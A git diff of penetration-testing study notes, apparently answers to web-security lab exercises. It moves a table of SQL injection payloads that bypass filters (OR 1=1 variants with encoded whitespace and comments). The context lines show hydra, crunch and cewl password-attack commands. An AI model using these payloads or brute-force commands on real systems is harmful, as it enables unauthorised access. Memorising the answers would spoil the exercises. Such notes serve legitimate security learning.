@@ -1,4 +1,17 @@
 # Phase III: Vulnerbility discovery & Exploitation
+## SQL Injection
+| excercise | solution |
+|-----------|----------|
+| example&nbsp;1 | root'+OR+'1'='1, `root'OR+1=1+--` |
+| example&nbsp;2 | root'%09OR'1'='1 |
+| example&nbsp;3 | root'/**/OR/**/'1'='1 |
+| example&nbsp;4 | 2+OR+1=1 |
+| example&nbsp;5 | 2+OR+1=1#123 |
+| example&nbsp;6 | 2+OR+1=1#123 |
+| example&nbsp;7 | 2%0AOR+1=1# |
+| example&nbsp;8 | name\`,IF((SELECT+0x61)=0x61%2Cid%2Cage)+%23 |
+| example&nbsp;9 | IF((SELECT+0x61)=0x61%2Cid%2Cage), `IF((SELECT'a')='a',id,age)` |
+
 ## Command Injection
 | excercise | solution |
 |-----------|----------|
@@ -38,19 +51,6 @@ hydra -P /usr/shared/wordlists/rockyou.txt
 * crunch 4 4 -t @%,^ -o mywordlist.txt `@=lowercase characters, %=numbers, ,=uppercase characters, ^=symbols`
 * crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o mywordlist
 * cewl -d 2 -m 4 -w test.txt http://www.php.net `-d=depth, -m=minimum word length, -w=write`
-
-## SQL Injection
-| excercise | solution |
-|-----------|----------|
-| example&nbsp;1 | root'+OR+'1'='1, `root'OR+1=1+--` |
-| example&nbsp;2 | root'%09OR'1'='1 |
-| example&nbsp;3 | root'/**/OR/**/'1'='1 |
-| example&nbsp;4 | 2+OR+1=1 |
-| example&nbsp;5 | 2+OR+1=1#123 |
-| example&nbsp;6 | 2+OR+1=1#123 |
-| example&nbsp;7 | 2%0AOR+1=1# |
-| example&nbsp;8 | name\`,IF((SELECT+0x61)=0x61%2Cid%2Cage)+%23 |
-| example&nbsp;9 | IF((SELECT+0x61)=0x61%2Cid%2Cage), `IF((SELECT'a')='a',id,age)` |
 
 ## Directory Traversal
 | excercise | solution |
